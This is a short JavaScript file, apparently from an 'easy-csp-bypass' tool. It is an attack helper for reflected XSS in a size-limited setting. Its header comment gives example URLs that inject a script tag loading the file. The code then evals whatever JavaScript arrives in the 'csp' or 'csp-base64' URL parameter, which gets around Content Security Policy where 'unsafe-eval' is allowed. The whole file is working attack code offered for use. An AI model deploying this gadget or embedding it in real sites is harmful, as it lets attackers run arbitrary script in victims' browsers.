/*
	Reflected XSS scenario where you are size limited.
	Condition needed: unsafe-eval

	This will look for the GET parameter "CSP" and evaluate it.

	Example:
	- http://vulnerable.com/?csp=alert('1')&search=<script src="//cdn.js/..../easy-csp-bypass/dist/url.js"></script>
	- http://vulnerable.com/?csp-base64=YWxlcnQoMSk7&search=<script src="//cdn.js/..../easy-csp-bypass/dist/url.js"></script>
*/

window.addEventListener("load", () => {
	const urlParams = new URLSearchParams(window.location.search);
	let csp = urlParams.get('csp');
	if (csp) eval(csp)

	csp = urlParams.get('csp-base64');
	if (csp) eval(atob(csp))
});
